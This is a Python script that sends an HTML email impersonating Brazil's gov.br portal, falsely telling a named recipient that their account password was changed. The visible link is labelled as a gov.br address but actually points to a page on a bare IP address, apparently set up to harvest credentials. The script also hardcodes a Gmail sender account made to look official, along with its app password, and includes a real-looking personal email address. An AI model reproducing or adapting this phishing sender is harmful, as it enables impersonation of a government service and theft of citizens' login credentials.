import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# CONFIGURAÇÕES
remetente = "cadastr0g0vofc@gmail.com"
senha_app = "johe jgcb nzol kadn"
destinatario = "EMAIL@gmail.com"

# Criando mensagem
mensagem = MIMEMultipart('alternative')
mensagem["From"] = remetente
mensagem["To"] = destinatario
mensagem["Subject"] = "gov.br: Aviso de alteração de dados da conta de acesso"

corpo = ""
html= '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Notificação gov.br</title>
<style>
body {
margin: 0;
padding: 0;
background-color: #e9e9e9;
font-family: Arial, Helvetica, sans-serif;
color: #222;
}

.container {
max-width: 900px;
margin: 0 auto;
padding: 40px 60px 80px 60px;
}

.logo {
margin-bottom: 40px;
font-size: 28px;
font-weight: bold;
color: #2b6cb0;
}

.logo span {
color: #f4b400;
}

h1 {
text-align: center;
font-size: 42px;
margin-bottom: 40px;
font-weight: 700;
}

p {
font-size: 20px;
line-height: 1.6;
margin-bottom: 30px;
}

.link {
color: #1a73e8;
text-decoration: none;
}

.link:hover {
text-decoration: underline;
}

.footer {
text-align: right;
margin-top: 80px;
font-size: 20px;
}

@media (max-width: 768px) {
.container {
padding: 30px;
}

h1 {
font-size: 32px;
}

p {
font-size: 18px;
}
}
</style>
</head>
<body>
<div class="container">

<!-- Espaço reservado para a imagem/logo -->
<div class="logo">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/3840px-Gov.br_logo.svg.png"l alt="logo" width="100">
</div>

<h1>Olá Guilherme,</h1>

<p>
Esta é uma notificação de que o campo "senha" foi alterado em sua conta de acesso no gov.br.
Você está recebendo este e-mail como informativo sobre mudança de dados de sua conta de acesso.
</p>

<p>
Operação realizada em 04/03/2026 às 8:30
</p>

<p>
Email: <a href="#" class="link">guinonino@gmail.com</a>
</p>

<p>
Se você não solicitou esta alteração, acesse
<a href="https://10.58.47.25/gov/gov.br.php" class="link">
https://e.gov.br/naoaltereI
</a>.
</p>

<p>
Nunca informe seus dados de acesso para outra pessoa
</p>

<div class="footer">
Equipe gov.br
</div>

</div>

</body>

</html>'''
mensagem.attach(MIMEText(html, "html"))
try:
    # Conexão com servidor SMTP do Gmail
    servidor = smtplib.SMTP("smtp.gmail.com", 587)
    servidor.starttls()
    servidor.login(remetente, senha_app)
    servidor.sendmail(remetente, destinatario, mensagem.as_string())
    servidor.quit()

    print("E-mail enviado com sucesso!")

except Exception as e:
    print("Erro ao enviar e-mail:", e)